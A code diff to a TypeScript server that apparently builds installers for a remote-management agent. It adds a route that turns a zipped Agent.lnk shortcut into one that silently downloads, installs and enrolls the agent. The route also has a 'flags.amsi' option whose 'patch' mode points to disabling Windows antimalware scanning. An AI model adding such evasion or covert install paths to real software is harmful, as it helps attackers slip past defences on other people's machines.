@@ -10,6 +10,13 @@ import { env } from "./env";
 import * as storage from "./storage";
 import * as builder from "./builder";
 import * as exeBuilder from "./exe-builder";
+import { runZipBuild, AmiMode } from "./zip-builder";
+import {
+  buildEnrollmentCommand,
+  toPowerShellInstallCommand,
+  AgentType,
+  InstallCommandInputs,
+} from "./install-command";
 
 const UUID_V4_REGEX =
   /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
@@ -266,6 +273,171 @@ async function postBuild(request: FastifyRequest, reply: FastifyReply) {
 }
 
 /**
+ * POST /build (Content-Type: application/json) — ZIP installer, STAGE 1.
+ *
+ * Takes the web app's already-resolved per-device values and rebuilds the
+ * install command server-side (defense in depth — never trusts the client's
+ * installCommand text alone), then runs New-AgentShortcut.ps1 under pwsh to
+ * produce an Agent.lnk that downloads AND enrolls. Persists the .lnk under a
+ * fresh jobId and returns { jobId } (STAGE 2 zips + links it).
+ */
+async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
+  // Authenticate via Authorization header (same shared secret as MSI path).
+  const authHeader = request.headers.authorization;
+  if (!authHeader || !authHeader.startsWith("Bearer ")) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+  const token = authHeader.slice(7); // Remove "Bearer "
+  if (!timingSafeCompare(token, env.GENERATOR_SECRET)) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+
+  const body = (request.body as Record<string, unknown>) ?? {};
+
+  // --- Resolved values (FINDING 3): generator consumes, never queries TRMM ---
+  const exeUrl = typeof body.exeUrl === "string" ? body.exeUrl.trim() : "";
+  if (!exeUrl) {
+    return reply.status(400).send({ error: "exeUrl is required" });
+  }
+  if (!exeUrl.startsWith("https://")) {
+    return reply.status(400).send({ error: "exeUrl must start with https://" });
+  }
+
+  const apiUrl = typeof body.apiUrl === "string" ? body.apiUrl.trim() : "";
+  if (!apiUrl || !apiUrl.startsWith("https://")) {
+    return reply
+      .status(400)
+      .send({ error: "apiUrl must be set and start with https://" });
+  }
+
+  const clientId =
+    typeof body.clientId === "number" && Math.floor(body.clientId) === body.clientId
+      ? body.clientId
+      : Number.isNaN(Number(body.clientId))
+        ? NaN
+        : Number(body.clientId);
+  if (Number.isNaN(clientId) || clientId <= 0) {
+    return reply
+      .status(400)
+      .send({ error: "clientId must be a positive integer" });
+  }
+
+  const siteId =
+    typeof body.siteId === "number" && Math.floor(body.siteId) === body.siteId
+      ? body.siteId
+      : Number.isNaN(Number(body.siteId))
+        ? NaN
+        : Number(body.siteId);
+  if (Number.isNaN(siteId) || siteId <= 0) {
+    return reply.status(400).send({ error: "siteId must be a positive integer" });
+  }
+
+  const agentType = body.agentType;
+  if (agentType !== "workstation" && agentType !== "server") {
+    return reply
+      .status(400)
+      .send({ error: 'agentType must be "workstation" or "server"' });
+  }
+
+  const authToken = typeof body.authToken === "string" ? body.authToken.trim() : "";
+  if (!authToken) {
+    return reply.status(400).send({ error: "authToken is required" });
+  }
+
+  // --- flags ---
+  const flags =
+    body.flags && typeof body.flags === "object"
+      ? (body.flags as Record<string, unknown>)
+      : {};
+
+  const amsi = (flags.amsi as AmiMode) ?? "none";
+  if (amsi !== "none" && amsi !== "also" && amsi !== "patch") {
+    return reply
+      .status(400)
+      .send({ error: 'flags.amsi must be "none", "also", or "patch"' });
+  }
+
+  const fileName =
+    typeof flags.fileName === "string" && flags.fileName.trim() !== ""
+      ? flags.fileName.trim()
+      : "trmm-agent.exe";
+  if (fileName.includes("/") || fileName.includes("\\") || fileName.includes("..")) {
+    return reply
+      .status(400)
+      .send({ error: "flags.fileName must be a bare filename (no path)" });
+  }
+
+  // Optional features (defaults to rdp/ping/power when absent/empty).
+  const features: string[] =
+    Array.isArray(body.features)
+      ? body.features
+          .filter((f): f is string => typeof f === "string" && f.trim() !== "")
+          .map((f) => f.trim())
+      : [];
+
+  // Client-provided PS text, used ONLY for validation/logging. The authoritative
+  // value is rebuilt below from resolved values (defense in depth).
+  const clientInstallCommand =
+    typeof body.installCommand === "string" ? body.installCommand : "";
+
+  const inputs: InstallCommandInputs = {
+    apiUrl,
+    clientId,
+    siteId,
+    agentType: agentType as AgentType,
+    authToken,
+    features,
+  };
+
+  // Rebuild server-side (mirror of toPowerShellInstallCommand's shape).
+  const fullCommand = toPowerShellInstallCommand(inputs, exeUrl);
+  // What actually gets embedded: just the enrollment step (the .lnk's own
+  // downloader already fetches + silently installs the base agent).
+  const enrollmentCommand = buildEnrollmentCommand(inputs);
+
+  // Create the job dir first so the .lnk lands under jobs/{jobId}/.
+  const jobId = storage.createJob();
+  const lnkPath = storage.lnkOutputPath(jobId);
+
+  try {
+    const result = await runZipBuild({
+      scriptPath: path.join(__dirname, "New-AgentShortcut.ps1"),
+      exeUrl,
+      fileName,
+      outputPath: lnkPath,
+      installCommand: enrollmentCommand,
+      authToken,
+      amsi,
+    });
+
+    if (!result.success) {
+      console.error(`ZIP build failed for job ${jobId}: ${result.output}`);
+      storage.cleanupJob(jobId);
+      return reply
+        .status(500)
+        .send({ error: "ZIP build failed", detail: result.output });
+    }
+
+    if (!fs.existsSync(lnkPath)) {
+      console.error(`ZIP build reported success but no Agent.lnk for ${jobId}`);
+      storage.cleanupJob(jobId);
+      return reply.status(500).send({ error: "Agent.lnk was not produced" });
+    }
+
+    console.log(
+      `ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}`
+    );
+
+    return reply.status(200).send({ jobId });
+  } catch (err) {
+    const message = err instanceof Error ? err.message : String(err);
+    console.error(`ZIP build error for job ${jobId}: ${message}`);
+    storage.cleanupJob(jobId);
+    return reply.status(500).send({ error: "Internal server error" });
+  }
+}
+
+/**
  * GET /downloads/:jobId - Stream the MSI file and clean up after.
  */
 async function getDownload(request: FastifyRequest, reply: FastifyReply) {
@@ -357,7 +529,17 @@ async function getExeDownload(request: FastifyRequest, reply: FastifyReply) {
  * Register routes with the Fastify instance.
  */
 export async function registerRoutes(app: FastifyInstance) {
-  app.post("/build", postBuild);
+  // /build serves two payload types on the same route, selected by
+  // Content-Type:
+  //   - multipart/form-data  -> MSI/VBS/EXE packaging (legacy path)
+  //   - application/json     -> ZIP installer (STAGE 1)
+  app.post("/build", async (request, reply) => {
+    const contentType = (request.headers["content-type"] ?? "").toLowerCase();
+    if (contentType.startsWith("application/json")) {
+      return postBuildZip(request, reply);
+    }
+    return postBuild(request, reply);
+  });
   app.get("/downloads/:jobId", getDownload);
   app.get("/downloads/:jobId/installer.vbs", getVbsDownload);
   app.get("/downloads/:jobId/installer.exe", getExeDownload);
